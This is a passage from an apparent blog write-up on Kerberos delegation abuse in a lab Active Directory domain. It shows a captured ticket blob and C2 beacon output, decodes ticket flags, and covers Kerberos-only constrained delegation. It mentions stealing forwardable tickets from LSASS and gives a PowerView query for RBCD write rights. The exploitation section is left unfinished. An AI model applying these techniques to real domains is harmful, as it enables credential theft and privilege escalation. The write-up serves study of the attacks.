KwTo8lTJNQbLpYaMmrAz8Op1q/0Kz1VVUVb39lUrZIdReoN6BN+SQ5TMPL6H4tANcRzVulK7+LuS6AMbBpoaH9Me3biKo/2emKe8jh0r/dCwQ8L6hPNU2HgddrjpkE5uOmGhzE+pCIrQTyDOHLSMcLSEwowrqNlZCTsOSdNiWB+Dfo/eOdVaR2Hf9jCrnkj3SGFyU+oKxeW7RvVjmrTPRmV1o4HXMIHUoAMCAQCigcwEgcl9gcYwgcOggcAwgb0wgbqgKzApoAMCARKhIgQgA3/TI3ao+rtKQ+7bqwj+kAFj51D0yrpEH5E9CcPqQeOhCxsJTE9MLkxPQ0FMohowGKADAgEKoREwDxsNQWRtaW5pc3RyYXRvcqMHAwUAAKEAAKURGA8yMDI2MDMyOTE2NTc1MlqmERgPMjAyNjAzMjkyMDA0NTdapxEYDzIwMjYwMzMwMTY1NzUyWqgLGwlMT0wuTE9DQUypEzARoAMCAQGhCjAIGwZTUlYwMiQ=
[+] Kerbeus DESCRIBE by RalfHacker
[+] host called home, sent: 24796 bytes
[+] received output:
[*] Action: Describe ticket

  ServiceName              :  SRV02$
  ServiceRealm             :  LOL.LOCAL
  UserName                 :  Administrator
  UserRealm                :  LOL.LOCAL
  StartTime (UTC)          :  29.03.2026 16:57:52
  EndTime (UTC)            :  29.03.2026 20:4:57
  RenewTill (UTC)          :  30.03.2026 16:57:52
  Flags                    :  renewable pre_authent enc_pa_rep  
  KeyType                  :  aes256_cts_hmac_sha1
```

If you haven’t noticed yet, using s4u here won’t get us anywhere. The ticket we receive won’t have the `forwardable` flag set to `1`, which means it can’t be reused for delegation. And without a forwardable ticket, the whole chain breaks and the attack dies right there.

#### Additional tip (why kerberos only is more secure)

But.. what about the TGS-REP that we got from the legitimate request, will it have `forwardable` flag? 

Only one way to find out.. Let's decrypt it!


The reason why I am decrypting it because the `flags` are not visible, as we can see that from the [RFC](https://datatracker.ietf.org/doc/html/rfc4120#section-5.4.2)
![image](/assets/img/Delegation/14.png)
_AS-REP and TGS-REP has the same structure and the name KDC-REP_

they're buried inside the encrypted part.
![image](/assets/img/Delegation/15.png)

the question that we should be asking now, which encrypted part that has the flags? we have two the inside the `ticket` and inside the `tgs-rep` itself
![image](/assets/img/Delegation/16.png)

actually both will have it, `EncTicketPart` and `EncKDCRepPart` one is for DC01 to read the flags and the other is for the client requesting the ticket to know what it just received. I will choose the `EncTicketPart` since I will directly use the `srv02$` key to decrypt it

> *The `EncTicketPart` is encrypted directly using `srv02$` key, while the `EncKDCRepPart` is encrypted using the TGT Session Key from the initial logon. that's why I choose the ticket part to decrypt*
{: .prompt-info }

So after decrypting it we will get this:
```shell
Sequence:
 field-0=1082195968
 field-1=Sequence:
  field-0=18
  field-1=0x191ff65e7edbbf9087c8fa7865a669010066bd962095a90ac6816d987c62e59d

 field-2=LOL.LOCAL
 field-3=Sequence:
  field-0=1
  field-1=SequenceOf:
   pixel

 field-4=Sequence:
  field-0=1
  field-1=

 field-5=20260328192943Z
 field-6=20260328192943Z
 field-7=20260329052943Z
 field-8=20260404192943Z
 field-9=SequenceOf:
  Sequence:
   field-0=1
   field-1=0x308202da308202d6a00402020080a18202cc048202c8050000000000000001000000f001000058000000000000000a0000001400000048020000000000000c0000004800000060020000000000000600000010000000a8020000000000000700000010000000b80200000000000001100800cccccccce0010000000000000000020074d3112be9bedc01ffffffffffffff7fffffffffffffff7f23b30ab4c6bedc01237374de8fbfdc01ffffffffffffff7f0a000a00040002000a000a0008000200320032000c000200000000001000020000000000140002000000000018000200b70000005604000001020000010000001c000200200000000000000000000000000000000000000008000a002000020006000800240002002800020000000000000000001002010000000000000000000000000000000000000000000000000000000000010000002c00020000000000000000000000000005000000000000000500000070006900780065006c00000005000000000000000500000070006900780065006c0000001900000000000000190000005c005c0043003a005c00700072006f006700720061006d0064006100740061005c0074006500730074002e00620061007400000000000000000000000000000000000000000000000000000000000000000000000000000001000000010200000700000005000000000000000400000044004300300031000400000000000000030000004c004f004c00000004000000010400000000000515000000cd77e25c5ee8c9fdc0d1ce6d0100000030000200070000000100000001010000000000120100000000000000806d5b3ae9bedc010a0070006900780065006c00000000001e00100012003000000000000000000070006900780065006c0040006c006f006c002e006c006f00630061006c0000004c004f004c002e004c004f00430041004c0000000000000010000000405ef1ca4b0b941d538adcd010000000d7dea67bbdc9c0406463ed02
  Sequence:
   field-0=1
   field-1=0x3041303fa0040202008da137043530333031a003020100a12a0428010000000020000035662d4bb4a93b91caa92059cc7409a5927e3c9aa09bef37f4c28d481d5507c9
```

The flags are in `field-0=1082195968` in hex it will will get `0x40820000` and in binary we will get this: `01000000100000100000000000000000`

if we go back to the RFC to see what bit we are looking for we can see this:
![image](/assets/img/Delegation/17.png)
And Kerberos reads these bits from left to right. so after mapping it we can see that second bit is set to `1` which indicates that the it IS forwardable.

And that is because when normal Windows computers request a Service Ticket, they natively set the forwardable request bit to 1 by default, just in case the destination server needs it. Because a real user proved their identity with a real password (this why we can scrape LSASS, steal this naturally forwardable ticket, and shove it into the S4U2proxy attack chain.)

But when forging S4U2self, we don't use the user's password.. in fact if DO have it there is no need for all of this delegation stuff, so as a security measure kerberos only make KDC issue a non-forwardable tickets.

## Abusing Kerberos Only

If you haven’t noticed yet, using s4u here won’t get us anywhere. The ticket we receive won’t have the `forwardable` flag set to `1`, which means it can’t be reused for delegation. And without a forwardable ticket, the whole chain breaks and the attack dies right there.

Beside stealing a valid TGS from LSASS and fed it to a s4u2proxy attack chain, I will write another way to abuse it later 


---

## RBCD


### Introduction
Resource-Based Constrained Delegation, well.. we can say it's the same as constrained delegation but the direction of granting permessions is the other way around, rather saying that "This service can delegate to that resource" it says "This resource trusts these specific services to act on behalf of users"
![image](/assets/img/Delegation/19.png)
_image from @_nwodtuhs_

Let's give an example to clarfiy things more..

In our setup we had our webserver `SRV02` configured for constrained delegation to the backend server *(imagine a MSSQL server for example but have `DC01` in our scenario)* and it has `msDS-AllowedToDelegateTo` attribute with `cifs\dc01` saved in it. Everyone is happy and it works just fine.. But we can face some issues:

- what if we wanted to add a new web server `SRV03` for example? even we are local admin on `SRV03` we can't edit `msDS-AllowedToDelegateTo` to add the SPN of the backend server which in our case is `cifs\dc01`. Why is that? because we don't have the [SeEnableDelegationPrivilege](https://0xpix3l.github.io/Active-Directory/Delegation/#seenabledelegationprivilege) that we talked about earlier and it is only given to DAs and EAs ONLY by default.

- The backend administrators had NO control over who was delegating to their resource.. any front-end service configured for delegation with the backend's SPN in its msDS-AllowedToDelegateTo list could freely impersonate any user to that backend

For these reasons RBCD was introduced in Windows Server 2012. It puts the control of the delegation is the hands of the backend service admins, No more need of editing the `msDS-AllowedToDelegateTo` attribute. Now backend admins can edit `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute that lives on the backend server to only limit certain services to be able to delegate to it. 

### Network Analysis

On the Network level it is exactly the same as Constrained Delegation, The difference happens inside the DC memory..

**If it's Traditional Constrained Delegation:**
1. KDC looks at the **Source** of the packet (`SRV02`).
2. It pulls the `msDS-AllowedToDelegateTo` attribute for `SRV02`.
3. It checks if `cifs/DC01` is in that text list.
4. If yes, send `TGS-REP`.

**If it's RBCD:**
1. KDC looks at the **Target** requested in the packet (`DC01`).
2. It pulls the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute for `DC01`.
3. It parses the **Security Descriptor (Binary)** to see if the SID of `SRV02` is allowed.
4. If yes, send `TGS-REP`.

### Configuring the ACE

RBCD is natively configured like protocol transition to support all modern authentication methonds, but doesn't have certain way to specify services like we did in constrained delegation since trust is granted at the machine account level via SID rather than per SPN. It simply says "Is SRV02$'s SID in msDS-AllowedToActOnBehalfOfOtherIdentity?" If so it passes.

So in order to edit this attribute we need to have the `msDS-AllowedToActOnBehalfOfOtherIdentity` write on our backend service (`DC01`) which can be done with Delegation of Control Wizard. I created group called `Web Admins` that has user `bob` in it, we will give that group this write permission. After right clicking on `Domain Controllers OU` we can use the wizard and add our group in.

![image](/assets/img/Delegation/20.png)

Then choose the write permission:
![image](/assets/img/Delegation/22.png)



### Enumeration
We need to see who has the ability to write to the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute..

explain it tomorrow..

```shell
Get-DomainComputer | Get-DomainObjectAcl | ? { $_.ObjectAceType -eq '3f78c3e5-f79a-46bd-a0b8-9d18116ddc79' -and $_.ActiveDirectoryRights -match 'WriteProperty' } | select ObjectDN,SecurityIdentifier

ObjectDN                                      SecurityIdentifier
--------                                      ------------------
CN=DC01,OU=Domain Controllers,DC=lol,DC=local S-1-5-21-1558345677-4257867870-1842270656-3603
CN=DC01,OU=Domain Controllers,DC=lol,DC=local S-1-5-10
CN=WS01,CN=Computers,DC=lol,DC=local          S-1-5-10
CN=ITComputer,OU=IT,DC=lol,DC=local           S-1-5-10
CN=SRV02,CN=Computers,DC=lol,DC=local         S-1-5-10
```

### Exploitation

Tomorrow..

---

## TO-DO
- More ways to abuse kerberos only
- Service Name Substitution
- ~~`/self` option in rubeus explaination~~  [here](https://0xpix3l.github.io/Active-Directory/Delegation/#abusing-unconstrained-delegation-2-more-advanced)
- ghost SPN 

## Refrences / Footnote

- [revisiting-delegate-2-thyself](https://exploit.ph/revisiting-delegate-2-thyself.html)
- [rfc4120](https://datatracker.ietf.org/doc/html/rfc4120)
- [Kerberos Protocol Extensions: Service for User and Constrained Delegation Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/)
- [S4U2Pwnage - Will Schroeder](https://harmj0y.medium.com/s4u2pwnage-36efe1a2777c)
- [Wagging the Dog: Abusing Resource-Based Constrained Delegation](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [Delegating Kerberos To Bypass Kerberos Delegation Limitation](https://www.youtube.com/watch?v=byykEId3FUs&t=1s)

[^blog]: [Windows authentication attacks part 2 – kerberos](https://blog.redforce.io/windows-authentication-attacks-part-2-kerberos/)
[^protected]: [Protected Users security group](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group)
[^ntlm]: [Windows authentication attacks – part 1](https://blog.redforce.io/windows-authentication-attacks-part-2-kerberos/)
[^PA-FOR-USER]: [PA-FOR-USER Checksum function](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/aceb70de-40f0-4409-87fa-df00ca145f5a)